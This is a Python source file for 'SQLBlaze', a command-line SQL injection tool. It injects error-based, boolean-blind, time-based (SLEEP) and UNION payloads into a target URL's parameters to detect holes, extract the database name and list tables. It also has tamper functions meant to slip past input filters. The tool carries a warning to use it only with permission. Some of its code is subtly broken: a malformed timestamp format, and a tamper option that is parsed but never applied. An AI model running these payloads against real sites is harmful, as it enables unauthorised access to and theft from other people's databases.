#!/usr/bin/env python3

import argparse
import logging
import sys
import os
import requests
import json
import sqlite3
import time
import urllib.parse
from typing import Dict, List, Optional
from http.cookiejar import MozillaCookieJar

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('sql_blaze.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class SQLBlaze:
    def __init__(self, url: str, method: str = 'GET', data: Optional[str] = None,
                 cookies: Optional[str] = None, proxy: Optional[str] = None,
                 output_dir: str = 'sql_blaze-output', quiet: bool = False):
        self.url = url
        self.method = method.upper()
        self.data = data if data else ''
        self.cookies = cookies
        self.proxy = {'http': proxy, 'https': proxy} if proxy else None
        self.output_dir = os.path.abspath(output_dir)
        self.log_dir = os.path.join(self.output_dir, 'logs')
        self.json_file = os.path.join(self.log_dir,
            f"sql_blaze_{time.strftime('%Y%m%d_%H%M%S')}.json")
        self.db_file = os.path.join(self.log_dir, 'sql_blaze.db')
        os.makedirs(self.log_dir, exist_ok=True)
        self.actions = []
        self.session = requests.Session()
        self.init_db()
        if quiet:
            logging.getLogger().handlers = [logging.FileHandler('sql_blaze.log')]
        if cookies and os.path.exists(cookies):
            self.session.cookies = MozillaCookieJar(cookies)
            self.session.cookies.load(ignore_discard=True, ignore_expires=True)

    def init_db(self):
        """Initialize SQLite database for storing action logs."""
        with sqlite3.connect(self.db_file) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS actions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    url TEXT,
                    action TEXT,
                    status TEXT,
                    output_path TEXT,
                    timestamp TEXT
                )
            ''')
            conn.commit()

    def store_action(self, action: str, status: str, output_path: str = ''):
        """Store action details in database."""
        timestamp = time.strftime('%Y-%m-d %H:%M:%S')
        with sqlite3.connect(self.db_file) as conn:
            cursor = conn.cursor()
            cursor.execute(
                'INSERT INTO actions (url, action, status, output_path, timestamp) '
                'VALUES (?, ?, ?, ?, ?)',
                (self.url, action, status, output_path, timestamp)
            )
            conn.commit()
        self.actions.append({
            'url': self.url,
            'action': action,
            'status': status,
            'output_path': output_path,
            'timestamp': timestamp
        })

    def send_request(self, url: str, payload: str, tamper: Optional[str] = None) -> Optional[requests.Response]:
        """Send HTTP request with injected payload."""
        try:
            if tamper == 'randomcase':
                payload = self.tamper_randomcase(payload)
            elif tamper == 'space2comment':
                payload = self.tamper_space2comment(payload)

            if self.method == 'GET':
                parsed_url = urllib.parse.urlparse(url)
                query = urllib.parse.parse_qs(parsed_url.query)
                for key in query:
                    query[key] = [payload]
                new_query = urllib.parse.urlencode(query, doseq=True)
                new_url = urllib.parse.urlunparse(
                    (parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                     parsed_url.params, new_query, parsed_url.fragment)
                )
                response = self.session.get(new_url, proxies=self.proxy, timeout=10)
            else:  # POST
                data = json.loads(self.data) if self.data.startswith('{') else urllib.parse.parse_qs(self.data)
                for key in data:
                    data[key] = [payload]
                if self.data.startswith('{'):
                    data = json.dumps(data)
                else:
                    data = urllib.parse.urlencode(data, doseq=True)
                response = self.session.post(url, data=data, proxies=self.proxy, timeout=10)

            response.raise_for_status()
            return response
        except requests.RequestException as e:
            logger.error(f"Request failed: {e}")
            return None

    def tamper_randomcase(self, payload: str) -> str:
        """Tamper: Randomize case of SQL keywords."""
        keywords = ['SELECT', 'FROM', 'WHERE', 'AND', 'OR', 'UNION']
        for kw in keywords:
            import random
            mixed = ''.join(random.choice([c.upper(), c.lower()]) for c in kw)
            payload = payload.replace(kw, mixed)
        return payload

    def tamper_space2comment(self, payload: str) -> str:
        """Tamper: Replace spaces with SQL comments."""
        return payload.replace(' ', '/**/')

    def detect_injection(self, param: str) -> bool:
        """Detect SQL injection vulnerability using error-based payloads."""
        payloads = [
            "' OR '1'='1",
            "'; --",
            "1' AND '1'='2"
        ]
        for payload in payloads:
            response = self.send_request(self.url, payload)
            if response and any(err in response.text.lower() for err in ['sql syntax', 'mysql', 'postgresql', 'sqlite']):
                status = f"SQL injection detected with payload: {payload}"
                logger.info(status)
                self.store_action("Detect Injection", status)
                return True
        status = "No SQL injection detected"
        logger.info(status)
        self.store_action("Detect Injection", status)
        return False

    def blind_injection(self, param: str, output_file: str):
        """Perform blind SQL injection (boolean-based)."""
        output_path = os.path.join(self.output_dir, output_file)
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        results = []

        # Simple boolean-based payload to extract database name
        charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
        db_name = ''
        for pos in range(1, 10):  # Assume DB name < 10 chars
            found = False
            for char in charset:
                payload = f"' AND ASCII(SUBSTR(DATABASE(),{pos},1))={ord(char)}--"
                response = self.send_request(self.url, payload)
                if response and len(response.text) > 100:  # Adjust based on true response
                    db_name += char
                    found = True
                    break
            if not found:
                break

        if db_name:
            results.append(f"Database name: {db_name}")
            with open(output_path, 'w') as f:
                f.write('\n'.join(results))
            status = f"Blind injection extracted data to {output_path}"
            logger.info(status)
            self.store_action("Blind Injection", status, output_path)
        else:
            status = "Blind injection failed to extract data"
            logger.error(status)
            self.store_action("Blind Injection", status)

    def time_based_injection(self, param: str, output_file: str):
        """Perform time-based SQL injection."""
        output_path = os.path.join(self.output_dir, output_file)
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        results = []

        # Time-based payload to detect delay
        payload = "' AND IF(1=1,SLEEP(5),0)--"
        start_time = time.time()
        response = self.send_request(self.url, payload)
        elapsed = time.time() - start_time

        if response and elapsed > 4:  # Delay indicates vulnerability
            results.append("Time-based injection successful")
            with open(output_path, 'w') as f:
                f.write('\n'.join(results))
            status = f"Time-based injection results saved to {output_path}"
            logger.info(status)
            self.store_action("Time-based Injection", status, output_path)
        else:
            status = "Time-based injection failed"
            logger.error(status)
            self.store_action("Time-based Injection", status)

    def enumerate_db(self, param: str, output_file: str):
        """Enumerate database information (tables, columns)."""
        output_path = os.path.join(self.output_dir, output_file)
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        results = []

        # Union-based payload to extract table names
        payload = "' UNION SELECT NULL,TABLE_NAME FROM information_schema.tables--"
        response = self.send_request(self.url, payload)
        if response:
            tables = [line for line in response.text.split('\n') if line.strip()]
            results.extend([f"Table: {table}" for table in tables[:5]])  # Limit to 5 for brevity

        if results:
            with open(output_path, 'w') as f:
                f.write('\n'.join(results))
            status = f"Database enumeration saved to {output_path}"
            logger.info(status)
            self.store_action("Enumerate DB", status, output_path)
        else:
            status = "Database enumeration failed"
            logger.error(status)
            self.store_action("Enumerate DB", status)

    def save_results(self):
        """Save action logs to JSON file."""
        with open(self.json_file, 'w') as f:
            json.dump({
                'url': self.url,
                'output_dir': self.output_dir,
                'actions': self.actions,
                'timestamp': time.strftime('%Y-%m-d %H:%M:%S')
            }, f, indent=4)
        logger.info(f"Results saved to {self.json_file}")

def main():
    parser = argparse.ArgumentParser(
        description="SQLBlaze: Tool for automated SQL injection testing.",
        epilog="Example: ./sql_blaze.py -a detect -u http://example.com?id=1"
    )
    parser.add_argument('-a', '--action', choices=['detect', 'blind', 'time-based', 'enumerate'],
                        required=True, help="Action to perform (detect, blind, time-based, enumerate)")
    parser.add_argument('-u', '--url', required=True, help="Target URL with injectable parameter")
    parser.add_argument('-m', '--method', choices=['GET', 'POST'], default='GET',
                        help="HTTP method (default: GET)")
    parser.add_argument('-d', '--data', help="POST data (e.g., 'id=1&name=test' or JSON)")
    parser.add_argument('-c', '--cookies', help="Path to Netscape cookie file")
    parser.add_argument('-p', '--proxy', help="Proxy URL (e.g., http://localhost:8080)")
    parser.add_argument('-o', '--output', default='sql_blaze-output',
                        help="Output directory (default: sql_blaze-output)")
    parser.add_argument('-t', '--tamper', choices=['randomcase', 'space2comment'],
                        help="Tamper script to bypass filters")
    parser.add_argument('-q', '--quiet', action='store_true',
                        help="Quiet mode (log to file only)")

    args = parser.parse_args()

    print("""
    ==============================
          SQLBlaze v1.0
      SQL Injection Tool
    ==============================
    WARNING: Use only on systems you own or have explicit permission to test.
    Unauthorized use may violate laws or terms of service.
    ==============================
    """)

    try:
        blaze = SQLBlaze(
            url=args.url,
            method=args.method,
            data=args.data,
            cookies=args.cookies,
            proxy=args.proxy,
            output_dir=args.output,
            quiet=args.quiet
        )

        param = 'id'  # Default injectable parameter
        output_file = f"{args.action.replace('-', '_')}_results.txt"

        if args.tamper:
            logger.info(f"Using tamper script: {args.tamper}")

        if args.action == 'detect':
            blaze.detect_injection(param)
        elif args.action == 'blind':
            blaze.blind_injection(param, output_file)
        elif args.action == 'time-based':
            blaze.time_based_injection(param, output_file)
        elif args.action == 'enumerate':
            blaze.enumerate_db(param, output_file)

        blaze.save_results()

    except Exception as e:
        logger.error(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()